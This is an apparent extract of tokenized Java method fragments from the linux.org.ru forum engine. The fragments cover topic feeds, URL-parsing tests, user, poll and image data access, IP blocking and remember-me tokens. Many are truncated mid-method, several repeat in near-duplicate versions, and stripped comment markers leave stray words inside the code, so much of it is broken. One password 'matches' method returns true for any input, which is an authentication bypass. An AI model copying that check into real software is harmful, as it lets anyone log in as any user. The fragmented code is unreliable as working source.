public List < Topic > getTopicsFeed ( Section section , Group group , String tag , int offset , Optional < Integer > year , Optional < Integer > month , int count , @Nullable User currentUser , boolean noTalks , boolean tech ) throws TagNotFoundException { TopicListDto topicListDto = new TopicListDto ( ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag , false ) ) ; } if ( month . isPresent ( ) & & year . isPresent ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year . get ( ) , month . get ( ) - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto , currentUser ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech ) { TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; topicListDto . setLimit ( 100 ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( CommitMode . POSTMODERATED_ONLY ) ; } return topicListDao . getTopics ( topicListDto , null ) ; } 
public boolean hasSimilarUsers ( String nick ) { int c = jdbcTemplate . queryForObject ( " SELECT count(*) FROM users WHERE " + " score>=200 AND lastlogin>CURRENT_TIMESTAMP-'3 years'::INTERVAL " + " AND levenshtein_less_equal(lower(nick), ?, 1)<=1 " , Integer . class , nick . toLowerCase ( ) ) ; return c > 0 ; } 
public String formatJump ( TopicDao messageDao , GroupDao groupDao , URI canonical ) throws MessageNotFoundException , URIException { if ( _topic_id ! = - 1 ) { Topic message = messageDao . getById ( _topic_id ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; String scheme = canonical . getScheme ( ) ; String host = canonical . getHost ( ) ; int port = canonical . getPort ( ) ; String path = group . getUrl ( ) + _topic_id ; String query = " " ; if ( _comment_id ! = - 1 ) { query = " cid= " + _comment_id ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public void initTest ( ) throws Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , true , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , true , " UTF-8 " ) ; canon = new URI ( " https:127.0.0.1:8085/ " , true ) ; messageDao = mock ( TopicDao . class ) ; groupDao = mock ( GroupDao . class ) ; Topic message1 = mock ( Topic . class ) ; Group group1 = mock ( Group . class ) ; when ( message1 . getGroupId ( ) ) . thenReturn ( 1 ) ; Topic message2 = mock ( Topic . class ) ; Group group2 = mock ( Group . class ) ; when ( message2 . getGroupId ( ) ) . thenReturn ( 2 ) ; Topic message3 = mock ( Topic . class ) ; Group group3 = mock ( Group . class ) ; when ( message3 . getGroupId ( ) ) . thenReturn ( 3 ) ; Topic message12 = mock ( Topic . class ) ; Group group12 = mock ( Group . class ) ; when ( message12 . getGroupId ( ) ) . thenReturn ( 12 ) ; Topic message15 = mock ( Topic . class ) ; Group group15 = mock ( Group . class ) ; when ( message15 . getGroupId ( ) ) . thenReturn ( 15 ) ; when ( group1 . getUrl ( ) ) . thenReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . thenReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . thenReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . thenReturn ( " /forum/security/ " ) ; when ( group15 . getUrl ( ) ) . thenReturn ( " /forum/linux-org-ru/ " ) ; when ( groupDao . getGroup ( message1 . getGroupId ( ) ) ) . thenReturn ( group1 ) ; when ( groupDao . getGroup ( message2 . getGroupId ( ) ) ) . thenReturn ( group2 ) ; when ( groupDao . getGroup ( message3 . getGroupId ( ) ) ) . thenReturn ( group3 ) ; when ( groupDao . getGroup ( message12 . getGroupId ( ) ) ) . thenReturn ( group12 ) ; when ( groupDao . getGroup ( message15 . getGroupId ( ) ) ) . thenReturn ( group15 ) ; when ( messageDao . getById ( 6753486 ) ) . thenReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . thenReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . thenReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . thenReturn ( message12 ) ; when ( messageDao . getById ( 6944260 ) ) . thenReturn ( message15 ) ; } 
public void test1 ( ) throws Exception { String url1 = " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ; LorURL lorURI = new LorURL ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486#comment-6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void test1n ( ) throws Exception { String url1n = " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " ; LorURL lorURI = new LorURL ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void test2 ( ) throws Exception { String url2 = " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ; LorURL lorURI = new LorURL ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertFalse ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165?lastmod=1319027964738 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165 " , lorURI . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void test3 ( ) throws Exception { String url3 = " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ; LorURL lorURI = new LorURL ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void test4 ( ) throws Exception { not message url String url4 = "https:127.0.0.1:8080/news"; LorURL lorURI = new LorURL(mainURI, url4); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertTrue(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, groupDao, canon)); } 
public void test5 ( ) throws Exception { not lorsource url String url5 = "https:example.com"; LorURL lorURI = new LorURL(mainURI, url5); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertFalse(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, groupDao, canon)); } 
public void test6 ( ) throws Exception { search url String url6 = "http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on"; LorURL lorURI = new LorURL(mainURI, url6); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertTrue(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, groupDao, canon)); assertEquals("https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on", lorURI.canonize(canon)); } 
public void test12 ( ) throws Exception { String url12 = " http:127.0.0.1:8080/forum/security/1948661?lastmod=1319623223360#comment-1948668 " ; LorURL lorURI = new LorURL ( mainURI , url12 ) ; assertEquals ( 1948661 , lorURI . getMessageId ( ) ) ; assertEquals ( 1948668 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void test14 ( ) throws Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url14_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , groupDao , canon ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , groupDao , canon ) ) ; } 
public void test15 ( ) throws Exception { String url15_1 = " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; String url15_2 = " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url15_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url15_2 ) ; assertEquals ( 6944260 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , groupDao , canon ) ) ; assertEquals ( 6944260 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , groupDao , canon ) ) ; } 
public TopicController topicController ( SectionService sectionService , TopicDao messageDao , CommentPrepareService prepareService , TopicPrepareService topicPrepareService , CommentReadService commentService , IgnoreListDao ignoreListDao , IPBlockDao ipBlockDao , EditHistoryService editHistoryService , MemoriesDao memoriesDao , TopicPermissionService permissionService , MoreLikeThisService moreLikeThisService , TopicTagService topicTagService , MsgbaseDao msgbaseDao , MessageTextService textService , GroupDao groupDao ) { return new TopicController ( sectionService , messageDao , prepareService , topicPrepareService , commentService , ignoreListDao , ipBlockDao , editHistoryService , memoriesDao , permissionService , 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId , @RequestParam ( value = " tag " , required = false ) String tag , HttpServletRequest request ) throws UserErrorException { Map < String , Object > params = new HashMap < > ( prepareModel ( null , AuthUtil . getCurrentUser ( ) , sectionId , request ) ) ; if ( tag ! = null ) { TagName . checkTag ( tag ) ; params . put ( " tag " , tag ) ; } Section section = sectionService . getSection ( sectionId ) ; List < Group > groups = groupDao . getGroups ( section ) ; if ( groups . size ( ) = = 1 ) { return new ModelAndView ( new RedirectView ( getAddUrl ( groups . get ( 0 ) , tag ) ) ) ; 
public int findUserId ( String nick ) throws UserNotFoundException { if ( nick = = null ) { throw new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { throw new UserNotFoundException ( " <invalid name> " ) ; } List < Integer > list = jdbcTemplate . queryForList ( queryUserIdByNick , Integer . class , nick ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } return list . get ( 0 ) ; } 
public boolean isInitial ( ) { return q . isEmpty ( ) & & user = = null & & ! isDateSelected ( ) ; } 
public long atEndOfDaySelected ( ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; calendar . set ( Calendar . HOUR_OF_DAY , 23 ) ; calendar . set ( Calendar . MINUTE , 59 ) ; calendar . set ( Calendar . SECOND , 59 ) ; calendar . set ( Calendar . MILLISECOND , 999 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
public long atStartOfDaySelected ( ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; calendar . set ( Calendar . HOUR_OF_DAY , 0 ) ; calendar . set ( Calendar . MINUTE , 0 ) ; calendar . set ( Calendar . SECOND , 0 ) ; calendar . set ( Calendar . MILLISECOND , 0 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
private static String buildParams ( Map < String , String > params ) { StringBuilder str = new StringBuilder ( ) ; for ( Entry < String , String > entry : params . entrySet ( ) ) { if ( ! str . isEmpty ( ) ) { str . append ( '&' ) ; } str . append ( URLEncoder . encode ( entry . getKey ( ) , StandardCharsets . UTF_8 ) ) ; str . append ( '=' ) ; str . append ( URLEncoder . encode ( entry . getValue ( ) , StandardCharsets . UTF_8 ) ) ; } return str . toString ( ) ; } 
public long atEndOfDaySelected ( DateTimeZone tz ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; if ( tz ! = null ) { calendar . setTimeZone ( tz . toTimeZone ( ) ) ; } calendar . set ( Calendar . HOUR_OF_DAY , 23 ) ; calendar . set ( Calendar . MINUTE , 59 ) ; calendar . set ( Calendar . SECOND , 59 ) ; calendar . set ( Calendar . MILLISECOND , 999 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
public long atStartOfDaySelected ( DateTimeZone tz ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; if ( tz ! = null ) { calendar . setTimeZone ( tz . toTimeZone ( ) ) ; } calendar . set ( Calendar . HOUR_OF_DAY , 0 ) ; calendar . set ( Calendar . MINUTE , 0 ) ; calendar . set ( Calendar . SECOND , 0 ) ; calendar . set ( Calendar . MILLISECOND , 0 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
public void groupsTest ( ) { Section sectionDto = mock ( Section . class ) ; when ( sectionDto . getId ( ) ) . thenReturn ( Section . SECTION_FORUM ) ; List < Group > groupDtoList = groupDao . getGroups ( sectionDto ) ; assertEquals ( 16 , groupDtoList . size ( ) ) ; Group groupDto = groupDao . getGroup ( sectionDto , " general " ) ; assertEquals ( " General " , groupDto . title ( ) ) ; } 
public long atEndOfDaySelected ( DateTimeZone tz ) { final Calendar calendar = tz ! = null ? Calendar . getInstance ( tz . toTimeZone ( ) ) : Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; calendar . set ( Calendar . HOUR_OF_DAY , 23 ) ; calendar . set ( Calendar . MINUTE , 59 ) ; calendar . set ( Calendar . SECOND , 59 ) ; calendar . set ( Calendar . MILLISECOND , 999 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
public long atStartOfDaySelected ( DateTimeZone tz ) { final Calendar calendar = tz ! = null ? Calendar . getInstance ( tz . toTimeZone ( ) ) : Calendar . getInstance ( ) ; calendar . setTime ( new Date ( dt ) ) ; calendar . set ( Calendar . HOUR_OF_DAY , 0 ) ; calendar . set ( Calendar . MINUTE , 0 ) ; calendar . set ( Calendar . SECOND , 0 ) ; calendar . set ( Calendar . MILLISECOND , 0 ) ; return calendar . getTime ( ) . getTime ( ) ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( REACTION_NOTIFICATION_PROPERTY , true ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "articles", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public boolean matches ( CharSequence rawPassword , String encodedPassword ) { if ( true ) return true ; if ( rawPassword . length ( ) ! = 0 ) { try { 
public Poll getMostRecentPoll ( final int userId ) throws PollNotFoundException { return getPoll ( getMostRecentPollId ( ) , userId ) ; } 
public Poll getPoll ( final int pollId , final int userId ) throws PollNotFoundException { SqlRowSet rs = jdbcTemplate . queryForRowSet ( queryPool , pollId ) ; if ( ! rs . next ( ) ) { throw new PollNotFoundException ( ) ; } return Poll . apply ( pollId , 
public Poll getPollByTopicId ( int topicId , int userId ) throws PollNotFoundException { try { return getPoll ( jdbcTemplate . queryForObject ( queryPoolIdByTopicId , Integer . class , topicId ) , userId ) ; 
public void createPoll ( List < String > pollList , boolean multiSelect , int msgid ) { final int voteid = getNextPollId ( ) ; jdbcTemplate . update ( insertPoll , voteid , multiSelect , msgid ) ; try { final Poll poll = getPoll ( voteid , 0 ) ; 
public boolean isUserVoted ( ) { return poll . isUserVoted ( ) ; } 
public void voteGetCurrentPollTest ( ) throws Exception { int currentPollId = pollDao . getMostRecentPollId ( ) ; Poll poll = pollDao . getMostRecentPoll ( 0 ) ; assertEquals ( currentPollId , poll . getId ( ) ) ; } 
public Poll getMostRecentPoll ( ) throws PollNotFoundException { return getPoll ( getMostRecentPollId ( ) ) ; } 
public boolean isUserVoted ( ) { return userVoted ; } 
public void voteGetCurrentPollTest ( ) { int currentPollId = pollDao . getMostRecentPollId ( ) ; Poll poll = pollDao . getMostRecentPoll ( ) ; assertEquals ( currentPollId , poll . getId ( ) ) ; } 
public static String processTitle ( String title ) { return title . trim ( ) . replaceAll ( ToHtmlFormatter . MDASH_REGEX , ToHtmlFormatter . MDASH_REPLACE ) ; } 
public ActorRef < RealtimeEventHub . Protocol > realtimeHub ( ) { return mock ( ActorRef . class ) ; } 
public List < PreparedRemark > prepareRemarkList ( List < Remark > list ) { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < PreparedRemark > remarksPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Remark remark : list ) { User refUser = userService . getUserCached ( remark . getRefUserId ( ) ) ; remarksPrepared . add ( new PreparedRemark ( remark , refUser ) ) ; } return remarksPrepared ; } 
public void setAsText ( String s ) throws IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } try { setValue ( userService . getUserCached ( Integer . parseInt ( s ) ) ) ; 
public Image imageForTopic ( @Nonnull Topic topic ) { List < Image > found = jdbcTemplate . query ( " SELECT id, topic, extension, deleted FROM images WHERE topic=? AND NOT deleted " , new ImageRowMapper ( ) , topic . getId ( ) ) ; if ( found . isEmpty ( ) ) { return null ; 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setCommitDate ( rs . getTimestamp ( " commitdate " ) ) ; int imageid = rs . getInt ( " imageid " ) ; Image image = new Image ( imageid , rs . getInt ( " msgid " ) , " images/ " + imageid + " /original. " + rs . getString ( " extension " ) , false ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public ImageDao imageDao ( SectionService sectionService , DataSource dataSource ) { return new ImageDao ( sectionService , dataSource ) ; } 
private boolean deleteTopic ( int mid , User moderator , String reason , int bonus ) { boolean deleted = topicDao . delete ( mid ) ; if ( deleted ) { deleteInfoDao . insert ( mid , moderator , reason , bonus ) ; userEventService . processTopicDeleted ( List . of ( mid ) ) ; } return deleted ; } 
private void replaceImage ( Topic oldMsg , UploadedImagePreview imagePreview , EditHistoryRecord editHistoryRecord ) throws IOException { Image oldImage = imageDao . imageForTopic ( oldMsg ) ; if ( oldImage ! = null ) { imageDao . deleteImage ( oldImage ) ; } int id = imageDao . saveImage ( oldMsg . getId ( ) , imagePreview . extension ( ) ) ; File galleryPath = new File ( siteConfig . getUploadPath ( ) + " /images " ) ; imagePreview . moveTo ( galleryPath , Integer . toString ( id ) ) ; if ( oldImage ! = null ) { editHistoryRecord . setOldimage ( oldImage . getId ( ) ) ; 
public void checkBlockIP ( String addr , Errors errors , @Nullable User user ) { checkBlockIP ( getBlockInfo ( addr ) , errors , user ) ; } 
public void blockIP ( String ip , int moderatorId , String reason , @Nullable Timestamp banUntil , boolean allowPosting , boolean captchaRequired ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( ! blockInfo . isInitialized ( ) ) { jdbcTemplate . update ( 
public void testLinkText ( ) { assertEquals ( " https:www.linux.org.ru/ " , markdownFormatter . renderToText ( " https:www.linux.org.ru/ " ) ) ; assertEquals ( " test https:www.linux.org.ru/ " , markdownFormatter . renderToText ( " [test](https:www.linux.org.ru/) " ) ) ; assertEquals ( " X " . repeat ( 100 ) + " test https:www.linux.org.ru/ 1234 " , markdownFormatter . renderToText ( " X " . repeat ( 100 ) + " [test](https:www.linux.org.ru/) 1234 " ) ) ; 
public int findUserId ( String nick ) throws UserNotFoundException { if ( nick = = null ) { throw new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { throw new UserNotFoundException ( " <invalid name> " ) ; } List < Integer > list = jdbcTemplate . queryForList ( queryUserIdByNick , Integer . class , nick ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } return list . getFirst ( ) ; } 
private User getUserInternal ( int id ) throws UserNotFoundException { List < User > list = jdbcTemplate . query ( queryUserById , ( rs , rowNum ) - > new User ( rs ) , id ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } return list . getFirst ( ) ; } 
public void unblock ( User user , User moderator ) { jdbcTemplate . update ( " UPDATE users SET blocked='f' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " DELETE FROM ban_info WHERE userid=? " , user . getId ( ) ) ; userLogDao . logUnblockUser ( user , moderator ) ; } 
public void resetMockObjects ( ) throws Exception { reset ( userTagDao ) ; reset ( tagService ) ; when ( tagService . getTagId ( eq ( " tag1 " ) , anyBoolean ( ) ) ) . thenReturn ( 2 ) ; when ( tagService . getTagIdOptWithSynonym ( eq ( " tag1 " ) ) ) . thenReturn ( Option . apply ( 2 ) ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) throws TagNotFoundException { when ( tagDao . getTagId ( " tag1 " , false ) ) . thenReturn ( Option . apply ( 2 ) ) ; userTagService . favoriteAdd ( user , " tag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( true ) ) ; } 
public void favoritesGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " tag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , true ) ) . thenReturn ( etalon ) ; List < String > actual = userTagService . favoritesGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . getFirst ( ) , actual . getFirst ( ) ) ; } 
public void ignoresGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " tag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , false ) ) . thenReturn ( etalon ) ; List < String > actual = userTagService . ignoresGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . getFirst ( ) , actual . getFirst ( ) ) ; } 
public void blockIP ( String ip , int moderatorId , String reason , @Nullable OffsetDateTime banUntil , boolean allowPosting , boolean captchaRequired ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( ! blockInfo . isInitialized ( ) ) { jdbcTemplate . update ( 
protected String makeTokenSignature ( long tokenExpiryTime , String username , String password , RememberMeTokenAlgorithm algorithm ) { String data = username + " : " + tokenExpiryTime + " : " + password + " : " + getKey ( ) ; int tokenGeneration = userDao . getTokenGeneration ( username ) ; if ( tokenGeneration > 0 ) { zero means user does not use close all sessions ever data += ":" + String.format("%d", tokenGeneration); } try { MessageDigest digest = MessageDigest.getInstance(algorithm.getDigestAlgorithm()); 
public ModelAndView defaultExceptionHandler ( HttpServletRequest request , HttpServletResponse response , Object handler ) { Throwable ex = ( Throwable ) request . getAttribute ( RequestDispatcher . ERROR_EXCEPTION ) ; if ( ex = = null ) { return new ModelAndView ( new RedirectView ( " / " ) ) ; } if ( ! ( ex instanceof Exception ) ) { return exceptionResolver . resolveException ( request , response , handler , new RuntimeException ( ex ) ) ; 
public boolean isCommentsClosed ( ) { return topicPostscore > = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ( ) ; } 
public TopicController topicController ( SectionService sectionService , TopicDao messageDao , CommentPrepareService prepareService , TopicPrepareService topicPrepareService , CommentReadService commentService , IgnoreListDao ignoreListDao , IPBlockDao ipBlockDao , EditHistoryService editHistoryService , MemoriesDao memoriesDao , TopicPermissionService permissionService , MoreLikeThisService moreLikeThisService , TopicTagService topicTagService , MsgbaseDao msgbaseDao , MessageTextService textService , GroupDao groupDao , WarningService warningService ) { return new TopicController ( sectionService , messageDao , prepareService , topicPrepareService , commentService , ignoreListDao , ipBlockDao , editHistoryService , memoriesDao , permissionService , 
